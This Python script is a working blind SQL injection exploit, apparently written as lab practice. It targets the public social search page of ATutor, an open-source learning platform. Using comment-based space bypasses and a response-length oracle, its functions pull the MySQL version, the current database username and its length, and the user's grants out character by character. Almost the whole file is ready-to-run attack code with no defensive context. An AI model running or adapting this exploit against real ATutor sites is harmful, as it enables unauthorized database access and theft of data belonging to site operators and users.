import requests
import sys
# original query: SELECT * FROM AT_members M WHERE (first_name LIKE '%aaa%'  OR second_name LIKE '%aaa%'  OR last_name LIKE '%aaa%'  OR login LIKE '%aaa%'  )
# SELECT IF(1=1,(SELECT length(current_user()) > 0),'a');
# SELECT IF(1=1,(SELECT length(current_user()) > 14),'a');
# sudo apt proxy install php5-xdebug is all awe need


def searchFriends_blind(ip, sub_query):
    injection_string_truthy = F"test')/**/or/**/(select/**/if(1=1,({sub_query}),1))%23"
    #injection_string_falsy = F"test')/**/or/**/(select/**/if(1=2,({sub_query}),1))%23"
    target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string_truthy}"
    #print(target)
    r = requests.get(target)
    content_length = int(r.headers['Content-Length'])
    #print(content_length)
    if (content_length == 180):
        return True
    return False
 
def extractDBVersion(ip):
    # injection_string = "test')/**/or/**/(select/**/if(1=1,(select/**/ascii(substring((select/**/version()),1,1))=53),1))"
    for i in range(1,20):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/version()),{i},1))={j}"
            if(searchFriends_blind(ip,sub_query)):
                sys.stdout.write(chr(j))
                sys.stdout.flush()
    print("\n(+) done")
def extractCurrentUserNameLength(ip):
    for i in range(0,32):
        sub_query = F"select/**/length(user())={i}"
        if(searchFriends_blind(ip,sub_query)):
            print("\n(+) Curent user's username is ", i, "characters long.")
            return i
def extractCurrentUsername(ip, username_length):
    username = ''
    for i in range(1,username_length+1):
        for j in range(32, 126):
            sub_query = F"select/**/ascii(substring((select/**/current_user()),{i},1))={j}"
            if(searchFriends_blind(ip,sub_query)):
                username += chr(j)
    print("\n(+) Current DB user is: ", username)   
    print("\n(+) done")
    pass
# old shit
def extractDBCurrentUserNameLengthOLD(ip):
    # mysql usernames were increased from 16 to 32 in version 8.0
    # its also worth mentioning that operating system user names can be longer depending on the OS, so 32 is a soft limit.
    # ideally this value should be changed after determining the version of mysqlr
    for i in range(0,32): 
        injection_string = F"test%27)/**/or/**/(select/**/if(1=1,(select/**/length(user())>{i}),'a'))%23"
        target = F"http://{ip}/ATutor/mods/_standard/social/index_public.php?q={injection_string}"
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length < 180):
            print ("user name length is: ", i)
            break
def searchFriends_sqli(ip, inj_str):
    for j in range(32, 126):
        # now we update the sqli
        target = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
        print(target)
        r = requests.get(target)
        content_length = int(r.headers['Content-Length'])
        if (content_length > 20):
            return j
    return None
def extractDBVersionOld(ip):
    print("(+) Retrieving database version....")
    # 19 is length of the version() string. This can
    # be dynamically stolen from the database as well!
    for i in range(1, 20):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")


def extractDBUser(ip):
    print("(+) Retrieving database current user....")
    for i in range(1, 16):
        injection_string = "test')/**/or/**/(ascii(substring((select/**/user()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")
def extractDBUserPrivs(ip):
    print("(+) Retrieving database user privs....")
    for i in range(1,1000):
        injection_string = "test')/**/or/**/(ascii(substring((show/**/grants/**/for/**/user()),%d,1)))=[CHAR]%%23" % i
        extracted_char = chr(searchFriends_sqli(ip, injection_string))
        sys.stdout.write(extracted_char)
        sys.stdout.flush()
    print("\n(+) done!")
def main():
    if len(sys.argv) != 2:
        print("(+) usage: %s <target>"  % sys.argv[0])
        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
        sys.exit(-1)

    ip = sys.argv[1]
    #extractDBVersion(ip)
    username_length = extractCurrentUserNameLength(ip)
    extractCurrentUsername(ip,username_length)

    #extractDBCurrentUserNameLength(ip)
    #extractDBUser(ip)
    #extractDBUserPrivs(ip)




if __name__ == "__main__":
    main()